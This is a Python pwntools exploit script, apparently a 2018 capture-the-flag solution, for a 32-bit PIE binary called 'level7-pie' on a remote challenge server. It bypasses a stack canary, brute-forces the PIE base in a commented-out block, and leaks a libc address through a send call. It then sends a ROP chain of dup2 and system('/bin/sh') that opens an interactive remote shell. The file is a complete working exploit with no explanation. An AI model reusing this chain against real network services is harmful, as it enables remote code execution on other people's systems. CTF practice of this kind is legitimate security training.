#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"

#r=remote("pwn.sixstars.team",22007)
#r=remote("0.0.0.0",0x2717)

elf = ELF("./level7-pie")
libc = ELF("./libc-2.23.so")
detect = 'a'*0x40 + chr(0)+ chr(78)+ chr(21)+chr(72) + 'a'*(0x4c-0x44)
#r.recv()

'''
to get pie_addr
send_addr = 0xf04 # the address to send sth
pie_pos = 0

i = 0x55000
while i < 0x57000:
    test_addr = p32(i*0x1000 + send_addr)
    payload = detect + 'a'*4 + test_addr + p32(0) + p32(4) + test_addr
    try:
        print hex(i)
        r=remote("10.132.141.60",22007)
        r.recv()
        r.sendline(payload)
        base_str= r.recvall()
        print i
    except:
        #r.close()
        print "connect error"
    else:
        i = i+1
        r.close()
        if base_str != '':
            print base_str
            pie_pos = i*0x1000 + send_addr
            break
        else:
            print 'addr_error'
    
print "the write func address is: " 
print hex(pie_pos)
text_base_addr = pie_pos - send_addr
print "the .text base addr is ,"
print hex(text_base_addr)
print '============='
'''
text_base_addr =0x56644000 # 0x5660c000 

print "send_addr_o"
print hex(elf.sym['send'])
print "elf.got[recv]"
print hex(elf.got['recv'])
r= remote("10.132.141.60", 22007)
r.recv()
#0xf04
payload = detect  + 'a'*4 + p32(text_base_addr + 0xf04) +p32(0)+p32(4) + p32(text_base_addr + elf.got['recv']) + p32(4) + p32(0)
r.sendline(payload)

base_str = r.recv()

word1 = base_str
print len(word1)
print '========'
word1 = word1[:4]
word1 = word1[::-1]
word1 = word1.encode('hex')
word1 = int(word1, 16)
print "the recv addr is: "
print hex(word1)

r.close()
'''
to pwn
'''
r=remote("10.132.141.60", 22007)
r.recv()
#word1 = 0xf7607220
recv_addr = libc.sym['recv']
libc.address = word1 -recv_addr

sh_addr = list(libc.search("/bin/sh"))[0]
execve_addr = libc.sym["system"]
dup_addr = libc.sym['dup2']
print hex(dup_addr)
print '====='

payload2 = detect + 'a'*4
payload2+= p32(dup_addr)
payload2+= p32(text_base_addr + 0x122a )
payload2+= p32(4)
payload2+= p32(0)
#payload2+= 'a'*4
payload2+= p32(dup_addr)
payload2+= p32(text_base_addr + 0x122a)
payload2+= p32(4)
payload2+= p32(1)
#payload2+= 'a'*4
payload2+= p32(execve_addr)
payload2+= p32(0)
payload2+= p32(sh_addr)

print len(payload2)
r.sendline(payload2)
r.interactive()
